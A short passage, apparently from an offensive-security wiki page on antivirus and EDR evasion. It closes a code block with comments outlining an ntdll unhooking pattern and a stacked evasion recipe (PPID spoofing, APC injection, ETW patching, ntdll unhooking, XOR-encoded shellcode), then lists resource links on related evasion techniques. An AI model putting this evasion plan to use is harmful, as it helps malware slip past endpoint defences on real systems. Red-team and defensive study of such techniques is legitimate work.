# GetModuleHandle(ntdll) + ReadFile(system32\ntdll.dll) → unhooking pattern

# Evasion stacking:
# PPID spoof + APC injection + ETW patch + ntdll unhook + XOR shellcode
# = minimal EDR telemetry, no static signatures, no obvious hook detection
```

## Resources

- AV-EDR-Evasion-Practical-Techniques-Course — `github.com/CyberSecurityUP`
- Related: [Indirect Syscalls](/evasion/indirect-syscalls/) — full syscall implementation reference
- Related: [DLL Unhooking](/evasion/dll-unhooking/) — detailed ntdll unhooking techniques
- Related: [ETW Bypass](/evasion/etw-bypass/) — comprehensive ETW evasion coverage
- Related: [APC Injection](/evasion/apc-injection/) — APC injection deep dive
- Related: [Shellcode Loaders](/evasion/shellcode-loaders/) — loader implementations
- Outflank: Direct Syscalls + sRDI — `outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/`
